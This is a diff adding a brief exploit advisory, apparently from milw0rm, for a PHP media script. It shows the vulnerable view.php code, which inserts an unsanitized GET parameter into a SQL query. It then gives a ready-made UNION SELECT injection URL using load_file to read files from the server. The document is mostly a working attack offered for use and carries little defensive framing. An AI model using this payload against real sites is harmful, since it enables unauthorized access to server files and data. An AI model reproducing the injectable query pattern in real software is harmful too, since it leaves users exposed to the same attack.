@@ -1,0 +1,22 @@
+#########################################################################################
+[0x01] Informations:
+Name           : Media Entertainment Script 1.0
+Download       : http://www.hotscripts.com/listings/jump/download/89424/
+Vulnerability  : Sql Injection To Lfi
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud To Be Italian
+Greetz         : //
+#########################################################################################
+[0x02] Bug:
+Bugged file is /[path]/view.php
+[code]
+$id  = $_GET['id'];
+$v = mysql_fetch_array(mysql_query("SELECT id,views,title FROM videos WHERE id='$id'"));
+[/code]
+#########################################################################################
+[0x03] Exploit:
+1- http://victim.it/path/view.php?id=-1' union select 0,0,0,load_file('lf'),0,0,0--
+########################################################################################
+
+# milw0rm.com [2009-03-24]
